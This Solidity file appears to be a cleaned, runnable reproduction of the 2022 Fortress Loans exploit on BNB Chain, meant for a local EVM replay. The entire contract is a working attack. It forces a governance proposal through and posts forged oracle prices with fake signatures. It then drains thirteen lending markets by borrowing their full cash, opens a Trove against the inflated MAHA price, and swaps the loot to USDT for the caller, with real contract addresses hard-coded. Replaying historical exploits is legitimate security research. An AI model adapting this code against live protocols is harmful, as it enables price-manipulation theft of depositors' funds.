// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Minimal cleaned synthetic for EVM Playground recorder (BSC FortressLoans 2022-05).
// No forge-std, no Test, no vm cheats. Logic extracted from registry PoC.
// External contracts (USDT, Governor, Oracle, fTokens, Pancake etc) are assumed present
// in the preloaded anvil_state accounts.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function deposit(uint256) external;
}

interface IFTS {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IfFTS {
    function mint(uint256) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IGovernorAlpha {
    function execute(uint256) external payable;
}

interface IChain {
    function submit(uint32, bytes32, bytes32[] memory, uint256[] memory, uint8[] memory, bytes32[] memory, bytes32[] memory) external;
}

interface IFortressPriceOracle {
    function getUnderlyingPrice(address fToken) external view returns (uint256);
}

interface IUnitroller {
    function enterMarkets(address[] memory) external returns (uint256[] memory);
    function getAllMarkets() external view returns (address[] memory);
}

interface IFBep20Delegator {
    function getCash() external view returns (uint256);
    function borrow(uint256) external returns (uint256);
    function underlying() external returns (address);
}

interface IPancakeRouter {
    function swapExactTokensForTokens(uint256, uint256, address[] memory, address, uint256) external returns (uint256[] memory);
    function swapExactETHForTokens(uint256, address[] memory, address, uint256) external payable returns (uint256[] memory);
}

interface IVyper {
    function exchange_underlying(int128, int128, uint256, uint256, address) external;
}

interface IBorrowerOperations {
    function openTrove(uint256, uint256, uint256, address, address, address) external;
}

interface IPriceFeed {
    function fetchPrice() external view returns (uint256);
}

contract Attack {
    event log_named_uint(string key, uint val);
    event log_string(string);

    // Key BSC addresses (from registry PoC)
    address constant FTS = 0x4437743ac02957068995c48E08465E0EE1769fBE;
    address constant fFTS = 0x854C266b06445794FA543b1d8f6137c35924C9EB;
    address constant GovernorAlpha = 0xE79ecdB7fEDD413E697F083982BAC29e93d86b2E;
    address constant ChainContract = 0xc11B687cd6061A6516E23769E4657b6EfA25d78E;
    address constant FortressPriceOracle = 0x00fcF33BFa9e3fF791b2b819Ab2446861a318285;
    address constant PriceFeed = 0xAa24b64C9B44D874368b09325c6D60165c4B39f2;
    address constant Unitroller = 0x67340Bd16ee5649A37015138B3393Eb5ad17c195;
    address constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant MAHA = 0xCE86F7fcD3B40791F63B86C3ea3B8B355Ce2685b;
    address constant BorrowerOperations = 0xd55555376f9A43229Dc92abc856AA93Fee617a9A;
    address constant ARTH = 0xB69A424Df8C737a122D0e60695382B3Eec07fF4B;
    address constant ARTHUSD = 0x88fd584dF3f97c64843CD474bDC6F78e398394f4;
    address constant Vyper1 = 0x98245Bfbef4e3059535232D68821a58abB265C45;
    address constant Vyper2 = 0x1d4B4796853aEDA5Ab457644a18B703b6bA8b4aB;

    function exploit() public payable {
        // EXPLOIT STEP: Execute the queued governance proposal (proposal 11) to set collateral factor for fFTS to 70%.
        IGovernorAlpha(GovernorAlpha).execute(11);

        // EXPLOIT STEP: Manipulate the price oracle by submitting fake high prices via the Umbrella Chain data feed.
        bytes32 _root = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d886;
        bytes32[] memory _keys = new bytes32[](2);
        _keys[0] = 0x000000000000000000000000000000000000000000000000004654532d555344;
        _keys[1] = 0x0000000000000000000000000000000000000000000000004d4148412d555344;
        uint256[] memory _values = new uint256[](2);
        _values[0] = 4e34;
        _values[1] = 4e34;
        uint8[] memory _v = new uint8[](4);
        _v[0] = 28;
        _v[1] = 28;
        _v[2] = 28;
        _v[3] = 28;
        bytes32[] memory _r = new bytes32[](4);
        _r[0] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d885;
        _r[1] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d882;
        _r[2] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d877;
        _r[3] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d881;
        bytes32[] memory _s = new bytes32[](4);
        _s[0] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d825;
        _s[1] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d832;
        _s[2] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d110;
        _s[3] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d841;
        IChain(ChainContract).submit(uint32(block.timestamp), _root, _keys, _values, _v, _r, _s);

        // EXPLOIT STEP: Verify the manipulated price is now live in Fortress's oracle view.
        uint256 _checkpoint;
        _checkpoint = IFortressPriceOracle(FortressPriceOracle).getUnderlyingPrice(fFTS);
        assert(_checkpoint == 4e34);

        // EXPLOIT STEP: Trigger PriceFeed.fetchPrice() which reads the poisoned UMB oracle price.
        _checkpoint = IPriceFeed(PriceFeed).fetchPrice();
        assert(_checkpoint == 2e34);

        // EXPLOIT STEP: Enter fFTS markets
        address[] memory _tmp = new address[](1);
        _tmp[0] = fFTS;
        IUnitroller(Unitroller).enterMarkets(_tmp);

        // EXPLOIT STEP: Provide 100 FTS Token as collateral, mint fFTS
        IFTS(FTS).approve(fFTS, type(uint256).max);
        uint256 _FTS_balance = IFTS(FTS).balanceOf(address(this));
        IfFTS(fFTS).mint(_FTS_balance);
        assert(IfFTS(fFTS).balanceOf(address(this)) == 499_999_999_999);

        // Get all Fortress Loans markets
        address[] memory markets = IUnitroller(Unitroller).getAllMarkets();
        address fbnb = markets[0];
        address fusdc = markets[1];
        address fusdt = markets[2];
        address fbusd = markets[3];
        address fbtc = markets[4];
        address feth = markets[5];
        address fltc = markets[6];
        address fxrp = markets[7];
        address fada = markets[8];
        address fdai = markets[9];
        address fdot = markets[10];
        address fbeth = markets[11];
        address fshib = markets[14];

        // Borrow ERC-20 Tokens
        IFBep20Delegator[13] memory Delegators = [
            IFBep20Delegator(fbnb),
            IFBep20Delegator(fusdc),
            IFBep20Delegator(fusdt),
            IFBep20Delegator(fbusd),
            IFBep20Delegator(fbtc),
            IFBep20Delegator(feth),
            IFBep20Delegator(fltc),
            IFBep20Delegator(fxrp),
            IFBep20Delegator(fada),
            IFBep20Delegator(fdai),
            IFBep20Delegator(fdot),
            IFBep20Delegator(fbeth),
            IFBep20Delegator(fshib)
        ];

        for (uint8 i; i < Delegators.length; i++) {
            uint256 borrowAmount = Delegators[i].getCash();
            Delegators[i].borrow(borrowAmount);
        }

        // EXPLOIT STEP: Use the also-manipulated MAHA price to open a large Trove
        IERC20(MAHA).approve(BorrowerOperations, type(uint256).max);
        IBorrowerOperations(BorrowerOperations).openTrove(
            1e18, 1e27, IERC20(MAHA).balanceOf(address(this)), address(0), address(0), address(0)
        );

        IERC20(ARTH).approve(ARTHUSD, type(uint256).max);
        IERC20(ARTHUSD).deposit(1e27);

        IERC20(ARTHUSD).approve(Vyper1, type(uint256).max);
        IERC20(ARTHUSD).approve(Vyper2, type(uint256).max);

        IVyper(Vyper1).exchange_underlying(0, 3, 5e26, 0, msg.sender);
        IVyper(Vyper2).exchange_underlying(0, 3, 15e26, 0, msg.sender);

        // End with USDT transfers/swaps to demonstrate profit (inline withdraw logic)
        withdrawAll();
    }

    function withdrawAll() public {
        // Swap each borrowed underlyings (except BNB, USDT direct) via Pancake to USDT to msg.sender
        address[] memory markets = IUnitroller(Unitroller).getAllMarkets();
        address fbnb = markets[0];
        address fusdc = markets[1];
        address fusdt = markets[2];
        address fbusd = markets[3];
        address fbtc = markets[4];
        address feth = markets[5];
        address fltc = markets[6];
        address fxrp = markets[7];
        address fada = markets[8];
        address fdai = markets[9];
        address fdot = markets[10];
        address fbeth = markets[11];
        address fshib = markets[14];

        IFBep20Delegator[13] memory Delegators = [
            IFBep20Delegator(fbnb),
            IFBep20Delegator(fusdc),
            IFBep20Delegator(fusdt),
            IFBep20Delegator(fbusd),
            IFBep20Delegator(fbtc),
            IFBep20Delegator(feth),
            IFBep20Delegator(fltc),
            IFBep20Delegator(fxrp),
            IFBep20Delegator(fada),
            IFBep20Delegator(fdai),
            IFBep20Delegator(fdot),
            IFBep20Delegator(fbeth),
            IFBep20Delegator(fshib)
        ];

        for (uint256 i = 0; i < 13; i++) {
            if (address(Delegators[i]) == 0xE24146585E882B6b59ca9bFaaaFfED201E4E5491) continue;
            if (address(Delegators[i]) == 0x554530ecDE5A4Ba780682F479BC9F64F4bBFf3a1) continue;

            address underlyAsset = Delegators[i].underlying();
            uint256 amount = IERC20(underlyAsset).balanceOf(address(this));

            address[] memory mulitHop = new address[](3);
            mulitHop[0] = underlyAsset;
            mulitHop[1] = WBNB;
            mulitHop[2] = USDT;
            IERC20(underlyAsset).approve(PancakeRouter, type(uint256).max);
            IPancakeRouter(payable(PancakeRouter)).swapExactTokensForTokens(
                amount, 0, mulitHop, msg.sender, block.timestamp
            );
        }

        // Swap WBNB->USDT to msg.sender
        address[] memory singleHop = new address[](2);
        singleHop[0] = WBNB;
        singleHop[1] = USDT;
        IPancakeRouter(payable(PancakeRouter)).swapExactETHForTokens{value: address(this).balance}(
            0, singleHop, msg.sender, block.timestamp
        );

        // Transfer all USDT balance to msg.sender (profit demonstration)
        uint256 usdt_balance = IERC20(USDT).balanceOf(address(this));
        IERC20(USDT).transfer(msg.sender, usdt_balance);
    }

    function kill() public {
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
